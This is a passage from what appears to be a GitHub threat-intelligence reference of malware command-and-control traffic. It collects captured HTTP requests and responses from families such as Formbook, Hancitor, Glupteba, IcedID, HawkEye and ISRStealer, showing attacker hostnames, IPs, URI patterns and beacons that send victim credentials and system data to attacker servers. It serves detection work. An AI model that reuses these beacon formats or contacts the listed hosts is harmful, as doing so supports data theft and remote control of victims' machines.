{"public_key":"-----BEGIN&#160;PUBLIC&#160;KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5pjgODTtZORmS4jeVWQV\\nvs71Fz\/NH7IWyR7an0L+rLo1S7Jrqn64J8LXlT\/1eiDN87tYle5AlB4\/vmf4Uo98\\ncMG\/E+NbFLtyRyxTq4RmaNDjyvTPIXbBl+cMU4yIwBKT89D8tuD6PhdfVVjMx71l\\niEPtuNb5pD38EYGv\/3+Yrwvg3sU1+aiIWdZgPX3ieFxAL3ZZkvlr5\/XeNpKqGAiT\\n6YBjLZg7R\/5j5Knhex+gKUR2Gkh2CG7mWqjcaNUK9Hzkgk3\/UmqopxokpSTkHmUT\\nSlN5mKAg438TmIUz4MCnnieexOtpcg7Fmn2wPObgdIG3OXK5yfxxExa+TBDTbCFc\\ngQIDAQAB\\n-----END&#160;PUBLIC&#160;KEY-----\\n","id":"Em9SPAhlG3hXHt713xEY92niynachhsXeWwCv6cB"}
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stopfilecoder.png "Expiro")


#### Fin7 JS Backdoor
~~~
POST /pictures/delete?type=name HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
Content-Length: 326
Host: moviedvdpower.com

lwirwavfynacqo=PKWFG%04S@XZ%16l%04%0E%00%02%00f%09%02%06%09%1EAC%04%0D%02%05%1FKVTK%5DG%0AX%08%07%0F%0D%00W%05%5B%5DQ%05%0D%0AV%0F%0B%5B%0B%03%0E%0FP%03%0B%01%06%0E%0C%5D%06V%1FLZZ%5C%05%02%05%09%08%03%07%1FMZS%04%0E%01%05%1FQW%0A%0C%0A%09%02%0D%02%03%07%03%0Cr%0Dx%7C%09%05%08gfD%5CJ%1Egz%1ECV%5E%5Dl%5E%5D%05%5DRN%26_%267983

HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 15 Oct 2019 16:27:41 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive

POST /new/new?type=name HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
Content-Length: 306
Host: moviedvdpower.com

lwirwavfynacqo=PG_EG%08%5BCXV%1Eo%04%02%08%01%00j%01%01%06%05%16BC%08%05%01%05%13CUTGUD%0AT%00%04%0F%01%08T%05WUR%05%01%02U%0F%07S%08%03%02%07S%03%07%09%05%0E%00U%05V%13DYZP%0D%01%05%05%00%00%07%13EYS%08%06%02%05%13YT%0A%00%02%0A%02%01%0A%00%07%0F%04q%0Dtt%0A%05%04oeDPB%1Dgv%16@VRUo%5EQ%0D%5ERB%26_%267500
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/fin7jsbackdoor.png "Fin7 JS Backdoor")

#### Flawedammyy
~~~
= ..">h..K...t.......N<.
.Q..1....%S-.8z...id=53292686&os=7 SP1 x86&priv=User+UAC&cred=USER-PC\admin&pcname=USER-PC&avname=&build_time=08-08-2019 14:24:35 PM&card=0&
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/flawedammyy.png "Flawedammyy")

#### Formbook
formbook hostnames are almost always www
~~~
POST /k9m/ HTTP/1.1
Host: www.liuhe127.com
Connection: close
Content-Length: 3769
Cache-Control: no-cache
Origin: http://www.liuhe127.com
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://www.liuhe127.com/k9m/
Accept-Language: en-US
Accept-Encoding: gzip, deflate

Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D2fNVsLRL8o7GMMvu8SY6wR8pwXAraJm4TKmuw5(TglqswaX2VpD_gJ3yal4FZ1pkDvEP81iuj_l_mMoqsdCGaFMxmu8LQC1CZjkxIXbFtlEaQg0Wfzvxpk9XRS39rZxxdqjALdRL8_N2LHRzPN35WuoIIn2J0mUB7u7x~42TwXHpZcLTJ4cELO23a_seXaFdgz~QWrxi7L3N9oGrwrY4tSxRUCsHQCoAB8CsxlUDIkY67TYTnYPmJxKxE06yA9NA5buPXUU-rDGiNGDQ25(b371m2NNnyheUxDNxyL6wr0syvlQ7Qn~DvzJO1j4_01FUfdeQKDmT9nuRD7AXJYaO3DIZnG1RWkvBxF0H38hB8-R7b1kP1IZqlFNLuC1ttRMUWPoRYyiYb-5rzJXywgOQncCVwVXcwH8dkVBf8nIw1doGRbV0yBZciG1vmCQMiyqspdkDVZt-1KyQhCCDaZWgyx(jUEtrJ5ZzRRfL7eaLGAG1u46ihMFAoJdDXorJcFL051WdJ2wHBfyMv2c9wu1j78lVpEWNkON2Qnw-8VOoQrg4ItHc4WjdsmkjCk(8A-d-uwY70GE0UXkWhPpg~_8qCqj_XNsXD1Cku4u0im9ibvYCLeQyYDn_FmL-U7ZNtOIbYeTHchiTz3fwdILdormZDVBuDzJlRACku5YKuqCIZoTnxUBI(iGkeX0da3GEkWCi8MA6nuA390kyWjwjSpzGHFYPG0B41C5bU5KrJx(9qiFYNfQPZqv5KDyJL8tN7jrqIny7WzTVRqvRHCeerIFPL5vosxC_3QvH2AlElM8Ssx(QZqz22ySsvMzyq8Hv~3tMLtg8mgzByn2dH2WrNAM3nk~XXu(6GurJtah4M9tPmohFGPLZxX5e3WCJ~h16eNNM4OaV~MOGVYusVrPgqFUS6P7iizTBZS(MsulNfuAKYvUq2kUMtCYSZAt34TUY6bJ5BTPy~4ydE8n16XohSRP8VbqhLAZ4DGO2n-hfrK2o9oUsNUWcpZyKA2(9kXBftM3s5lzWT21wBKbcPaiPURUuV4eheOkTBTxTB_mMxCafVVE6yvbJD-XIpSazCu(sS7~QUEbh6EPrqsB11rhKlRPy39G2rLo6lSMHeGjCmI5Rc80lhtZyFKcqhNYbhwuiEn3uK9CodgYxVie6yY1MwI(M8VSBZ-zQjldjXnFN~7oKDW3JglzgbK3lzeDK5aRb0HTwohxi8M9lRkTKflhtcr77iOlBVcE6HYSbchngmsBWBgPwA75xvzJhUUtgjJlxLW~bSPMG7x7GLVfCZjxxrjki0R9ZPDVdx71eP4yoIdymwRgqddVSuGCAIf641vyoItI9QzfvvuZBdpRQi3ZEw7LUifYAyjYZ2Xd9KdOMiNiLLeLsDCgWib~5r8iSfExWtFjsEgOt(2W_0JQSAgplkqJxkO9YxSdB9xsPfeavxYirf7azw7UGnDTEMQUnMMECFM5_v29oh6tKvIolHPv_qZrW0nGwd0aCMfzUqcV0(NlfiEQOxVZTonlWkJoR3hyyZQ~dKGW9j_WbA-8s54GvC-VC~skS2jG4haG9bxKA6QZqRK4-2qI5o2U3rNoeQEz_~yMfZ2fQoftvSkgpJfcgjuh3qTOFK8b6OSe5wMnyLdniF_4xN3rO(73lGUB5l60LbBa4TAYc(Qn7pyfvhlhMx8nr0vm6kCom1xi-VN1M(fSDqNubOVR_8QORONDFaX41G3HYOrWQyQ5Cvd6lAFgWycF3KeaumEH0LEUP7vR3t8CqgQ5VqyDxtKNy0Z7MVbqsq6s8~aYdnUL5DxSG9pbe8LW4uDqLcBuZ2WiDWmdiRx0cbf9-s0qx6mSwAo(Wz67SmWp2X8VI3W4h3M3vf9BggKJQmHp7nLChKFWJWTuEGt43fxqjimz5WaRYtGOcdlH84XYvX9kEB1C4(Fp99P6VKHhrkuCOrtiirAvl7KvjXYhsiOn20cjKKUL6l8(aZofg6g(CqTpB5dDGN86Korg1L6advz28Cc9QidH5ZPIAHrWXi9nG5FtnBxG-3R2N(J6V~IGsC8NZIwv0qB~35YLhS9SlyD38(p(pgy9N3fPHO9Gzlzd6D3j74fN-N89jhcQTClusyQIhdjrYsqWnpi7Of2Hl9zRx(ut-kFP33A5zYLbDn54f9gg8kH1m(BeKfVXxVtpGLR4VQSBfZzVwPGnUei9aJDZkXwmg0xftRV~S3TxUucpU1d75Pa9NCvgMU51f7uv0XtF1S-0_nqUy(apdab1FJcSzLOVDXJDyOKr5P4px5QpKM1FZgH9mgQQZuo~rlcBi4jISUNx3qv7fwaBZ4KDYuICC1-KLeFh0i7YEU_njjPm31uzkYLlVxfbhAg6C7Fxcpr5_jzhW~me85m48ifV4C06qNAN5WgIGxJW07CUNAuLx2d4tZI85EWgoxQa3AOuINyalNllQZt2LBB~ReVqa8Gr3pLpZOSiDREVqDaruTFqNwAZndKWZ~CTIV4ss6txpH7ypXw3AZ4fiDn5j7NDtaJzXbptIpWgrv9yK(zab71BYxnEuPpsdZSnA2QWY9s300CraaT3RPj(gdt~5OjaG22qma1M9LYzgvBdIBH57aizchPopkjnWiJAuvabKSvJyEtKb5Ni67H1WbOnOKM8pMcqsaIBi1AfQV0PbikKmG-HikPS86JBnJXZs8BWrbgm7g8uGrVpnnuHbHuP4p4xAOgYNPDbnpSoXn0kH~vUc1JxLurnAnNWMmYgA5g3fIw7HGvJSnKn6DDHod7HUKWF3ggfFJdZbucZxbJ2fpE64O6nKFy9It-R0BRZqcunVVvWy4zwCQ_1brWO78sSQY3WY4Es8kI6nl5hc9k3dhAWgQJWeqVrUGnOyxnf3wP9Tjc3fbhhfMthKeTVJEn485mDsUhxaOlIUrAoNDk1Kmua8F3zzcHpo~ixmjApivEsgkkIIni~mHnw4sce0IaJmWT9Ka_FCRQTC3dNAkBJHjcfTsYpgDvJBeZI8V7tnXTcJwQShoQoTdzOUvebgdia2s6HyC8Ay3lybE0Kvi4Ufu2qeJDnpSdiZAi8Ba-AzxnhL~66T~sQU0SY1ZDTJsdMD9zA8h5A0g71lMEIFSEdczwnvBeXpuEiaX9FOoJQwoIyyq4KmaeML~f5ipBL5MgqKf36tQ4N9jiM0IMAZdarP~ZkdSRs6dnJ7bU4FFMvQUrM0EGSJMQfLAvB7d_c0IwGUl44oifYX7n8cNJQcRPEFt1PZYPKE47I_JQ2CSVE9Scfi6hmF2mrjjozj0NQFcK5B~W~c3GpQxJ8e9cNoWhrkZNK1CyKcuTjHkfWA5Bzoi5p5mrTFsA12M25Ubt5SuEd-grtNyFbdev6Uyoislno4UJ9J6-8ag6iZXJd_QI17cAFS4P71bi7ApOh50qN4cNMIQBUTQyriS5BG~os6RMAuoaSUq92eNx12764W~RIGssW6ItGJFcg09D9nPLTs9jUhkhVwPicIhcak5ZLrkASapi44847mp8bI7hAIINPrZaKEyXejiDm5OUm7UVGno15_(251Jq3-Aic6sgovlTvlWBTFSkikUCmSMDX96nLlTuNiC2BD42WLJfGoZQw4T341YKl3rFShZ24mtmUGThc4k-k1OxGK1ygo5wLOg_H_Bs9MfxPn3aoIQiBq(XC7l4Xzw2LREItIvFPQXoWU(dxz3g)..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/formbook.png "Formbook")

#### GET2Loader (TA505):
~~~
POST /2021 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
Content-Length: 95
Host: windows-sys-update.com

&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
Server: nginx/1.10.3
Date: Wed, 09 Oct 2019 18:53:18 GMT
Content-Length: 0
Connection: keep-alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")

#### Glupteba
~~~
POST /bots/post-ia-data?uuid=de7cfeb2-8d6a-480d-9043-488b8a616d7b HTTP/1.1
Host: venoxcontrol.com
User-Agent: Go-http-client/1.1
Content-Length: 8843
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip

[{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"DXM_Runtime","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Office Proof (French) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Security Update for Microsoft Office 2010 (KB2289078)","display_version":"","install_date":""},{"display_name":"Microsoft Outlook Social Connector (KB2289116) ..........s","display_version":"","install_date":""},{"display_name":"Definition update for Microsoft Office 2010 (KB982726)","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Publisher 2010 (KB2409055)","display_version":"","install_date":""},{"display_name":"IEData","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2151757","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X64 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared 32-bit MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Microsoft Office Professional 2010","display_version":"14.0.4763.1000","install_date":""},{"display_name":"Microsoft Office Publisher MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Outlook MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2202188)","display_version":"","install_date":""},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2467173","display_version":"","install_date":""},{"display_name":"Google Update Helper","display_version":"1.3.33.23","install_date":"20190319"},{"display_name":"IE40","display_version":"","install_date":""},{"display_name":"IE4Data","display_version":"","install_date":""},{"display_name":"Java 8 Update 92 (64-bit)","display_version":"8.0.920.14","install_date":"20180208"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"VLC media player","display_version":"2.2.6","install_date":""},{"display_name":"WinRAR 5.60 (64-bit)","display_version":"5.60.0","install_date":""},{"display_name":"Microsoft Office Single Image 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Access Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Adobe Flash Player 27 PPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X86 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Mozilla Firefox 67.0.4 (x64 en-US)","display_version":"67.0.4","install_date":""},{"display_name":"SchedulingAgent","display_version":"","install_date":""},{"display_name":"Microsoft Office Excel MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Skype... 7.39","display_version":"7.39.102","install_date":"20180208"},{"display_name":"CCleaner","display_version":"5.35","install_date":""},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":"20190321"},{"display_name":"Microsoft Office Access MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"Adobe Acrobat Reader DC MUI","display_version":"15.007.20033","install_date":"20180208"},{"display_name":"MPlayer2","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161","display_version":"9.0.30729.6161","install_date":"20180208"},{"display_name":"Microsoft Office Proofing (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (Spanish) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Adobe Flash Player 27 ActiveX","display_version":"27.0.0.187","install_date":""},{"display_name":"Adobe Flash Player 27 NPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Google Chrome","display_version":"75.0.3770.100","install_date":"20180208"},{"display_name":"Microsoft Office Word MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft OneNote 2010 (KB2433299)","display_version":"","install_date":""},{"display_name":"Microsoft Office OneNote MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB982573","display_version":"","install_date":""},{"display_name":"Realtek AC'97 Audio","display_version":"","install_date":""},{"display_name":"MobileOptionPack","display_version":"","install_date":""},{"display_name":"Microsoft Office PowerPoint MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Update for Microsoft .NET Framework 4.7.2 (KB4087364)","display_version":"1","install_date":""},{"display_name":"Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030","display_version":"11.0.61030.0","install_date":""},{"display_name":"AddressBook","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Word 2010 (KB2345000)","display_version":"","install_date":""},{"display_name":"Microsoft Office Shared Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":""},{"display_name":"Connection Manager","display_version":"","install_date":""},{"display_name":"Fontcore","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"Mozilla Maintenance Service","display_version":"67.0.4","install_date":""},{"display_name":"Notepad++ (64-bit x64)","display_version":"7.5.1","install_date":""},{"display_name":"WIC","display_version":"","install_date":""},{"display_name":"QEMU guest agent","display_version":"2.10.68","install_date":"20190730"},{"display_name":"Update for Microsoft Outlook Social Connector (KB2289116)","display_version":"","install_date":""},{"display_name":"Microsoft Office Office 32-bit Components 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Java Auto Updater","display_version":"2.8.92.14","install_date":"20180208"},{"display_name":"DirectDrawEx","display_version":"","install_date":""},{"display_name":"IE5BAKEX","display_version":"","install_date":""},{"display_name":"Opera 12.15","display_version":"12.15.1748","install_date":""},{"display_name":"Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219","display_version":"10.0.40219","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2005 Redistributable (x64)","display_version":"8.0.61000","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.30501","display_version":"12.0.30501.0","install_date":""}]
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-1.png "Glupteba")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-2.png "Glupteba")

#### Godzilla Loader
~~~
GET /gate16.php?g=-994429369&k=7NLp9MrFuKWnfhYAmxKEcsWO2 HTTP/1.1
Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: filesdb.ru
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 01 Sep 2018 12:12:58 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Keep-Alive: timeout=60
Set-Cookie: PHPSESSID=btq14ialn2bbefrsvedfspt9s4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Encoding: gzip

<div id="s">IKqglmKsWN8CSCWpwIItt6O/sFpxceFdZPucGXeeUi1CbtjgXllqiSnOcsojWNxNP8ySG4XsKU94bKJh2vFSAtqb+g939WslRHMzKsr2YaDwN51PG9a/CZ/BVaK3Idznf3tkNJAy9+6r6vj/9spjxPp1+pqK3DrdVr7uJG0xkSv8Ez7fmCPgc4YrHpSk2cMvODT9bbv1eNE4zjGd+N4t3Lhp/+k48QWtGIQ48A6Q9HzhWO1L4SpVawEVg/hbN+EJSCVhQCIljVpvrcyeY6w1yX9QT5TSZosQlbzog3mLceYYz1teNlHwhGToXVDb9ACyxlo/FrdlapR/R0jCx0F+OQ==</div>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/godzilla.png "Godzilla Loader")

#### GrandSteal
~~~
GET /websocket HTTP/1.1
Host: 162.218.122.115:2012
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: Yzg2MDllOTctZGYzMCOOZQ==
Origin: ws://162.218.122.115:2012

HTTP/1.1 101 Switching Protocols
Server: nginx
Date: Fri, 18 Oct 2019 00:41:37 GMT
Connection: upgrade
Upgrade: WebSocket
Sec-WebSocket-Accept: 3pYl7XQW+GMu4ydBWBEUXbuIKJo=

.þ... o>..Í8).i<. e-_A.Mjc.WjN.mjT.WaG.,.U.SnJ%._y.>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>
. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>
. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>

.~..."ª..Ê.......... .(.8.@...ugmajJAPYc
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/grandsteal.png "GrandSteal")

#### Hancitor
~~~
POST /4/forum.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Host: spausence.com
Content-Length: 108
Cache-Control: no-cache

GUID=8996434259757519954&BUILD=0210_328487&INFO=USER-PC @ USER-PC\admin&IP=89.187.165.57&TYPE=1&WIN=6.1(x64)HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:17:51 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.4.45

FFUUARZAEg4OCkBVVQ0NDVQVFB8eEx0TGBUCVBkVF1UNClcZFRQOHxQOVQoWDx0TFAlVCRcbCA5XCRYTHh8IV0lVExQZFg8eHwlVSwYSDg4KQFVVDQ0NVA4SGVcbFBQfAlQZFRdVDQpXGRUUDh8UDlVLBhIODgpAVVUXGw4fCBMbFlcUHwgPHlQID1UNClcTFBkWDx4fCVUKFRcVVUsGEg4OCkBVVRkWHwwfCB8eDxkbDhMVFFQZFRdUGw9VDQpXExQZFg8eHwlVDRMeHR8OCVVLBhIODgpAVVUfGRsIHwoSVBUIHVUNClcZFRQOHxQOVQoWDx0TFAlVGBgKFQ0fCAobGRFVExQZFg8eHwlVSwcBGEASDg4KQFVVDQ0NVBUUHx4THRMYFQJUGRUXVQ0KVxkVFA4fFA5VChYPHRMUCVUJFxsIDlcJFhMeHwhXSVUTFBkWDx4fCVVIBhIODgpAVVUNDQ1UDhIZVxsUFB8CVBkVF1UNClcZFRQOHxQOVUgGEg4OCkBVVRcbDh8IExsWVxQfCA8eVAgPVQ0KVxMUGRYPHh8JVQoVFxVVSAYSDg4KQFVVGRYfDB8IHx4PGRsOExUUVBkVF1QbD1UNClcTFBkWDx4fCVUNEx4dHw4JVUgGEg4OCkBVVR8ZGwgfChJUFQgdVQ0KVxkVFA4fFA5VChYPHRMUCVUYGAoVDR8IChsZEVUTFBkWDx4fCVVIBwEIQBIODgpAVVUNDQ1UFRQfHhMdExgVAlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVQkXGwgOVwkWEx4fCFdJVRMUGRYPHh8JVUkGEg4OCkBVVQ0NDVQOEhlXGxQUHwJUGRUXVQ0KVxkVFA4fFA5VSQYSDg4KQFVVFxsOHwgTGxZXFB8IDx5UCA9VDQpXExQZFg8eHwlVChUXFVVJBhIODgpAVVUZFh8MHwgfHg8ZGw4TFRRUGRUXVBsPVQ0KVxMUGRYPHh8JVQ0THh0fDglVSQYSDg4KQFVVHxkbCB8KElQVCB1VDQpXGRUUDh8UDlUKFg8dExQJVRgYChUNHwgKGxkRVRMUGRYPHh8JVUkH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hancitor.png "Hancitor")

#### Hawkeye keyogger
~~~
From: mosharrof@mhcapparels.com
To: mosharrof@mhcapparels.com
Date: 9 Oct 2019 01:57:35 +0100
Subject: HawkEye Keylogger - Reborn v9 - Passwords Logs - admin \ USER-PC -
 89.187.165.47
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkNClBhc3N3b3JkcyBMb2dzDQphZG1p
biBcIFVTRVItUEMNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")

#### Icedid
~~~
GET /photo.png?id=0181B9BACBCF3080870000000000FF40000001 HTTP/1.1
Connection: Keep-Alive
Host: eurobable.com

HTTP/1.1 200 OK
Server: openresty
Date: Wed, 16 Oct 2019 15:30:33 GMT
Content-Type: application/octet-stream
Content-Length: 605211
Connection: keep-alive
Last-Modified: Tue, 08 Oct 2019 11:43:19 GMT
ETag: "5d9c7657-93c1b"
Accept-Ranges: bytes

.PNG
.
...
IHDR..............N.T....sRGB.........gAMA......a....	pHYs..........o.d.	;.IDATOLrEV.....Le.D|...Rp.{..D...g`...a@.\8,E
.~1Z..X.N...^G.....,f$.c.......ru.#O..'.~.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid-2.png "Icedid")

URI for websocket is usually data2.php
~~~
GET /data2.php?1C00C7CC98D464FE HTTP/1.1
Host: memphase.com
Upgrade: websocket
Connection: Upgrade

HTTP/1.1 101 Switching Protocols
Server: openresty
Date: Thu, 10 Oct 2019 19:28:34 GMT
Connection: upgrade
Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
Upgrade: websocket
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid.png "Icedid websocket")

#### Imminent RAT
~~~
00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")

#### ISRStealer
~~~

GET /boss/index.php?action=add&username=honey@pot.com&password=honeypass356&app=Opera&pcname=USER-PC&sitename=https://www.facebook.com HTTP/1.1
User-Agent: HardCore Software For : Public
Host: expressdeliveryfx.com
Cookie: PHPSESSID=ni2v6p8vt6p48qcvm48rj7qqt0

HTTP/1.1 200 OK
Connection: Keep-Alive
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Tue, 08 Oct 2019 14:06:15 GMT
Server: LiteSpeed
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")

#### JSSLoader
~~~
POST /gate.php?bot_id=JenniferPCJENNIFERPCVMware564db87746ebb934e9e0b94b413682b8 HTTP/1.1
Content-Type: application/json
Host: dempoloka.com
Content-Length: 242
Expect: 100-continue
Connection: Keep-Alive

AAAAAA==
AQAAAA==
